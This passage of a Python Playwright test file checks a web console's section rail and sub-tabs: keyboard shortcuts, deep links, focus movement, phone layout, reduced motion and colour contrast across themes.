        # any), the fragment not following, and `g b` no longer closing the panel.
        keys = (("i", "work", "inbox"), ("f", "work", "feed"), ("k", "work", "tickets"), ("p", "work", "prs"),
                ("y", "automation", "playbooks"), ("t", "automation", "triggers"), ("o", "projects", "portfolio"),
                ("s", "projects", "favorite"), ("c", "team", "chat"))
        for kind in BROWSERS:
            with self.subTest(browser=kind):
                url = self.serve()
                page = self.page(kind, 1280, url)
                page.evaluate("document.activeElement.blur()")
                self.g(page, "2")   # before any use: the section's first sub-tab
                _wait_for(page, "document.querySelector('.ck-panel').dataset.open === 'true'")
                self.assertEqual(page.evaluate(CURRENT), ["automation", "playbooks"])
                for key, sec, tab in keys:
                    self.g(page, key)
                    _wait_for(page, "w => { const c = (%s)(); return c[0] === w[0] && c[1] === w[1]; }" % CURRENT, [sec, tab])
                    self.assertEqual(page.evaluate("location.hash"), f"#{tab}&section={sec}")
                for key, want in (("1", ["work", "prs"]), ("2", ["automation", "triggers"]),
                                  ("3", ["projects", "favorite"]), ("4", ["team", "chat"])):
                    self.g(page, key)
                    _wait_for(page, "w => { const c = (%s)(); return c[0] === w[0] && c[1] === w[1]; }" % CURRENT, want)
                self.g(page, "b")
                _wait_for(page, "document.querySelector('.ck-panel').dataset.open === 'false'")
                page.keyboard.press("?")
                text = page.locator("#ck-shortcut-help").text_content()
                for k in ("g 1", "g 2", "g 3", "g 4", "Work section", "Team section", "Open Chat tab (Team)"):
                    self.assertIn(k, text)

    def test_deep_links_open_their_tab_and_say_the_section(self):
        # Catches: a 1.47 link (#feed, #chat) that no longer opens its tab now that tabs sit in sections; #tab= and
        # #section= not understood; a link to a section not landing on its first sub-tab; and a fragment that does
        # not name the section once the console has opened. #item= and #qid= keep opening the item.
        cases = (("#tickets", ["work", "tickets"]), ("#chat", ["team", "chat"]),
                 ("#tab=triggers", ["automation", "triggers"]), ("#section=projects", ["projects", "portfolio"]),
                 ("#favorite&section=projects", ["projects", "favorite"]))
        for kind in BROWSERS:
            with self.subTest(browser=kind):
                url = self.serve()
                self.ask(1)
                for frag, want in cases:
                    page = self.page(kind, 1280, url + frag)
                    _wait_for(page, "w => { const c = (%s)(); return c[0] === w[0] && c[1] === w[1]; }" % CURRENT, want)
                    self.assertEqual(page.evaluate("location.hash"), f"#{want[1]}&section={want[0]}")
                    page.close()
                for frag in ("#item=LANE.1", "#qid=LANE.1%2FQ1"):
                    page = self.page(kind, 1280, url + frag)
                    page.wait_for_selector(".ck-questions-heading")
                    self.assertEqual(page.locator(".ck-rail").count(), 0)   # an item view, not the tabs
                    page.close()

    def test_changing_section_moves_focus_to_its_active_sub_tab(self):
        # Catches: focus left on the rail button the redraw threw away (it falls to <body>, and the next Tab starts
        # from the top of the page), or put anywhere but the new section's selected sub-tab; by mouse and by keyboard.
        for kind in BROWSERS:
            with self.subTest(browser=kind):
                url = self.serve()
                page = self.page(kind, 1280, url)
                self.open_inbox(page, 1280)
                page.click(".ck-rail-btn[data-section='projects']")
                _wait_for(page, "document.activeElement && document.activeElement.id === 'ck-tab-portfolio'")
                self.assertEqual(page.evaluate("document.activeElement.getAttribute('aria-selected')"), "true")
                page.click("#ck-tab-favorite")
                page.focus(".ck-rail-btn[data-section='projects']")
                page.keyboard.press("ArrowUp")
                page.keyboard.press("ArrowUp")
                page.keyboard.press("Enter")
                _wait_for(page, "document.activeElement && document.activeElement.id === 'ck-tab-inbox'")
                # And back: the section's last-used sub-tab, focused.
                page.focus(".ck-rail-btn[data-section='work']")
                page.keyboard.press("End")
                page.keyboard.press("ArrowUp")
                page.keyboard.press(" ")
                _wait_for(page, "document.activeElement && document.activeElement.id === 'ck-tab-favorite'")

    def test_arrow_keys_rove_the_rail_and_walk_only_the_sections_strip(self):
        # Catches: a rail with one Tab stop per button (roving tabindex lost), arrows that open a section instead of
        # moving focus, no wrap or no Home/End, and sub-tab arrows that walk into another section's tabs.
        for kind in BROWSERS:
            with self.subTest(browser=kind):
                url = self.serve()
                page = self.page(kind, 1280, url)
                self.open_inbox(page, 1280)
                stops = "() => [...document.querySelectorAll('.ck-rail-btn')].filter(b => b.tabIndex === 0).map(b => b.dataset.section)"
                focused = "() => document.activeElement && (document.activeElement.dataset.section || document.activeElement.id)"
                self.assertEqual(page.evaluate(stops), ["work"])
                page.focus(".ck-rail-btn[data-section='work']")
                for key, want in (("ArrowDown", "automation"), ("ArrowRight", "projects"), ("ArrowDown", "team"),
                                  ("ArrowDown", "work"), ("ArrowUp", "team"), ("Home", "work"), ("End", "team"),
                                  ("ArrowLeft", "projects")):
                    page.keyboard.press(key)
                    self.assertEqual(page.evaluate(focused), want, key)
                    self.assertEqual(page.evaluate(stops), [want])
                self.assertEqual(page.evaluate(CURRENT), ["work", "inbox"])   # moving focus opened nothing
                page.focus("#ck-tab-inbox")
                page.keyboard.press("ArrowLeft")    # wraps within Work, never into Automation
                _wait_for(page, "document.activeElement && document.activeElement.id === 'ck-tab-prs'")
                page.keyboard.press("ArrowRight")
                _wait_for(page, "document.activeElement && document.activeElement.id === 'ck-tab-inbox'")
                page.keyboard.press("End")
                _wait_for(page, "document.activeElement && document.activeElement.id === 'ck-tab-prs'")
                self.assertEqual(page.evaluate(CURRENT), ["work", "prs"])

    def test_on_a_phone_the_console_is_the_whole_screen_with_a_bottom_bar(self):
        # Catches (U2, uxshot 02): the console pinned to the right of a host page wider than the phone, so it started
        # 164px in and was cut off; the host scrolling or taking taps underneath; the scroll lock not lifted on
        # close; bottom-bar targets under 48px or not at the bottom; a strip that wraps; and sideways overflow
        # anywhere in the console.
        for kind in BROWSERS:
            with self.subTest(browser=kind):
                url = self.serve(page=PHONE_HOST)
                self.ask(1)
                page = self.page(kind, 390, url, mobile=True, height=844)
                self.assertGreater(page.evaluate("document.documentElement.scrollWidth"), 500)   # the spill is real
                page.evaluate("ConsoleKit.openTab('inbox')")
                page.wait_for_selector(".ck-panel[data-open='true'] .ck-rail")
                page.wait_for_timeout(400)   # the slide-in
                box = page.evaluate("""() => { const r = document.querySelector('.ck-panel').getBoundingClientRect();
                  return [r.left, r.top, r.width, r.height, innerWidth, innerHeight]; }""")
                self.assertAlmostEqual(box[0], 0, delta=1)
                self.assertAlmostEqual(box[1], 0, delta=1)
                self.assertAlmostEqual(box[2], 390, delta=1)
                self.assertAlmostEqual(box[3], box[5], delta=1)
                self.assertTrue(page.evaluate("document.documentElement.classList.contains('ck-phone-open')"))
                self.assertEqual(page.evaluate("getComputedStyle(document.body).overflowX"), "hidden")
                hits = page.evaluate("""() => { const p = document.querySelector('.ck-panel'); const out = [];
                  for (const x of [2, 100, 200, 300, 388]) for (const y of [2, 200, 420, 640, 842])
                    out.push(p.contains(document.elementFromPoint(x, y))); return out; }""")
                self.assertEqual(hits, [True] * 25)
                bar = page.evaluate("""() => [...document.querySelectorAll('.ck-rail-btn')].map(b => {
                  const r = b.getBoundingClientRect(); return [r.width, r.height, r.bottom]; })""")
                self.assertEqual(len(bar), 4)
                for w, h, bottom in bar:
                    self.assertGreaterEqual(w, 48)
                    self.assertGreaterEqual(h, 48)
                    self.assertAlmostEqual(bottom, box[5], delta=1)
                self.assertEqual(len(set(page.evaluate("() => [...document.querySelectorAll('.ck-tabs .ck-tab')]"
                                                       ".map(t => Math.round(t.getBoundingClientRect().top))"))), 1)
                for sel in (".ck-panel", ".ck-section-main", ".ck-body"):
                    self.assertTrue(page.evaluate("s => { const e = document.querySelector(s); return e.scrollWidth <= e.clientWidth; }",
                                                  sel), sel)
                self.assertTrue(page.is_visible(".ck-header .ck-back-btn"))
                self.assertTrue(page.is_visible(".ck-header .ck-close-btn"))
                page.click(".ck-rail-btn[data-section='team']")
                page.wait_for_selector(".ck-rail-btn[data-section='team'][aria-current='page']")
                page.click(".ck-header .ck-close-btn")
                _wait_for(page, "!document.documentElement.classList.contains('ck-phone-open')")
                self.assertEqual(page.evaluate("getComputedStyle(document.body).overflowX"), "visible")

    def test_below_400px_the_rail_shows_icons_with_names_and_labels_elsewhere(self):
        # Catches (U8, amends D9): labels left on show below 400px; labels hidden with display:none or no aria-label
        # (the buttons lose their names); no tooltip; and labels hidden at 400px and wider, where D9 still wants them.
        for kind in BROWSERS:
            for width, labelled in ((390, False), (400, True), (1280, True)):
                with self.subTest(browser=kind, width=width):
                    url = self.serve()
                    self.ask(1)
                    page = self.page(kind, width, url)
                    self.open_inbox(page, width)
                    widths = page.evaluate("() => [...document.querySelectorAll('.ck-rail-label')]"
                                           ".map(l => l.getBoundingClientRect().width)")
                    self.assertEqual(len(widths), 4)
                    for w in widths:
                        (self.assertGreater if labelled else self.assertLessEqual)(w, 1 if not labelled else 10)
                    if labelled:   # D9: a shown label is whole, never "Automat…" (the current one is bold, so wider)
                        page.click(".ck-rail-btn[data-section='automation']")
                        page.wait_for_selector(".ck-rail-btn[data-section='automation'][aria-current='page']")
                        self.assertTrue(page.evaluate("() => [...document.querySelectorAll('.ck-rail-label')]"
                                                      ".every(l => l.scrollWidth <= l.clientWidth)"))
                    for label in ("Work", "Automation", "Projects", "Team"):
                        btn = page.get_by_role("button", name=re.compile("^" + label))
                        self.assertEqual(btn.count(), 1, label)
                        self.assertTrue(btn.get_attribute("title").startswith(label))
                    self.assertEqual(page.locator(".ck-rail-btn[data-section='work']").get_attribute("aria-label"),
                                     "Work, 1 waiting for you")

    def test_motion_runs_on_a_real_change_and_never_under_reduced_motion(self):
        # Catches (U9): a section or sub-tab change with no motion wired; motion that ignores prefers-reduced-motion
        # (the body's fade and slide, and the rail indicator's slide).
        for kind in BROWSERS:
            for reduced in (False, True):
                with self.subTest(browser=kind, reduced=reduced):
                    url = self.serve()
                    page = self.page(kind, 1280, url, reduced=reduced)
                    self.open_inbox(page, 1280)
                    names = """() => [getComputedStyle(document.querySelector('.ck-body')).animationName,
                      getComputedStyle(document.querySelector('.ck-rail-btn[aria-current="page"]'), '::before').animationName,
                      getComputedStyle(document.querySelector('.ck-body')).transitionDuration]"""
                    page.click(".ck-rail-btn[data-section='projects']")
                    page.wait_for_selector("#ck-tab-portfolio[aria-selected='true']")
                    got = page.evaluate(names)
                    self.assertEqual(got, ["none", "none", "0s"] if reduced else ["ck-section-in", "ck-rail-mark-y", "0s"])
                    page.click("#ck-tab-favorite")
                    page.wait_for_selector("#ck-tab-favorite[aria-selected='true']")
                    self.assertEqual(page.evaluate(names)[:2], ["none", "none"] if reduced else ["ck-subtab-in", "none"])

    def test_a_redraw_on_the_same_tab_never_replays_the_motion(self):
        # Catches (U9): the switch's animation replaying on every long-poll redraw (each one rebuilds the body; the
        # 1.47 fade on .ck-body did exactly this), and a count or badge change animated.
        for kind in BROWSERS:
            with self.subTest(browser=kind):
                url = self.serve()
                page = self.page(kind, 1280, url)
                self.open_inbox(page, 1280)
                page.click("#ck-tab-feed")
                page.wait_for_selector(".ck-body.ck-enter-tab")
                page.wait_for_timeout(400)   # past the 140 ms slide
                page.evaluate("window.__body = document.querySelector('.ck-body')")
                self.ask(1)   # the agent asks: liveLoop's wait answers and the panel redraws on the same tab
                _wait_for(page, "document.querySelector('.ck-body') !== window.__body"
                                " && !!document.querySelector('.ck-rail-btn[data-section=work] .ck-rail-badge')", timeout=15000)
                still = page.evaluate("""() => { const b = document.querySelector('.ck-body');
                  return [b.className, getComputedStyle(b).animationName, b.getAnimations().length,
                    document.querySelector('.ck-rail').classList.contains('ck-rail-moved'),
                    getComputedStyle(document.querySelector('.ck-rail-badge')).animationName,
                    getComputedStyle(document.querySelector('#ck-tab-inbox .ck-tab-note')).animationName]; }""")
                self.assertEqual(still, ["ck-body", "none", 0, False, "none", "none"])
                self.assertEqual(page.evaluate(CURRENT), ["work", "feed"])

    def test_an_inbox_row_at_390_is_two_lines_not_three(self):
        # Catches (U2, uxshot 02): the priority row wrapping into the lane/id line, the ⌛ alone on a second line and
        # the clipped question on a third.
        for kind in BROWSERS:
            with self.subTest(browser=kind):
                url = self.serve(page=PHONE_HOST)
                for n in (1, 2):
                    self.ask(n, text=f"Question {n}: how many times should a failed job retry before it is dead-lettered?")
                page = self.page(kind, 390, url, mobile=True, height=844)
                page.evaluate("ConsoleKit.openTab('inbox')")
                page.wait_for_selector(".ck-priority-row")
                # Lines are told apart by each part's vertical centre: the ⌛ button is taller than the words beside it.
                lines = page.evaluate("""() => { const row = document.querySelector('.ck-priority-row');
                  const mid = r => Math.round(r.top + r.height / 2);
                  const top = s => { const e = row.querySelector(s); return e ? mid(e.getBoundingClientRect()) : null; };
                  const tops = [...row.children].filter(c => c.getBoundingClientRect().height > 0)
                    .map(c => mid(c.getBoundingClientRect()));
                  const distinct = [...new Set(tops)].sort((a, b) => a - b).filter((t, i, a) => i === 0 || t - a[i - 1] > 6);
                  return [distinct.length, top('.ck-priority-project'), top('.ck-snooze'), top('.ck-priority-when'),
                          top('.ck-priority-text'), row.scrollWidth <= row.clientWidth + 1]; }""")
                n, project, snooze, when, text, fits = lines
                self.assertEqual(n, 2)
                self.assertLessEqual(abs(snooze - project), 6)   # line one: which, and its ⌛
                self.assertGreater(text, project + 6)            # line two: the question and its age
                self.assertLessEqual(abs(when - text), 6)
                self.assertTrue(fits)
                qid = page.evaluate("() => { const e = document.querySelector('.ck-priority-qid'); return e.scrollWidth <= e.clientWidth; }")
                self.assertTrue(qid)   # the id is never cut

    def test_the_rail_reads_in_every_theme_and_skin(self):
        # Catches: rail labels, the indicator or the badge too faint on a palette: text under 4.5:1, the indicator
        # under 3:1 against the rail (WCAG 1.4.3, 1.4.11). Plain --c-fg-muted and --c-accent fail Solarized and Nord.
        for kind in BROWSERS:
            with self.subTest(browser=kind):
                url = self.serve()
                self.ask(1)
                page = self.page(kind, 1280, url)
                self.open_inbox(page, 1280)
                for skin in ("", "solarized", "nord", "contrast"):
                    for theme in ("light", "dark"):
                        page.evaluate("([s, t]) => { const r = document.documentElement;"
                                      " if (s) r.dataset.skin = s; else delete r.dataset.skin; r.dataset.theme = t; }",
                                      [skin, theme])
                        pairs = page.evaluate("""() => { const rail = getComputedStyle(document.querySelector('.ck-rail')).backgroundColor;
                          const cs = (s, p) => getComputedStyle(document.querySelector(s), p || null);
                          return { label: [cs('.ck-rail-btn:not([aria-current])').color, rail],
                                   current: [cs('.ck-rail-btn[aria-current="page"]').color, cs('.ck-rail-btn[aria-current="page"]').backgroundColor],
                                   mark: [cs('.ck-rail-btn[aria-current="page"]', '::before').backgroundColor, cs('.ck-rail-btn[aria-current="page"]').backgroundColor],
                                   badge: [cs('.ck-rail-badge').color, cs('.ck-rail-badge').backgroundColor] }; }""")
                        for what, need in (("label", 4.5), ("current", 4.5), ("mark", 3.0), ("badge", 4.5)):
                            ratio = page.evaluate(CONTRAST_JS, pairs[what])
                            self.assertGreaterEqual(ratio, need, f"{skin or 'primer'} {theme} {what} {pairs[what]}")


if __name__ == "__main__":
    unittest.main()
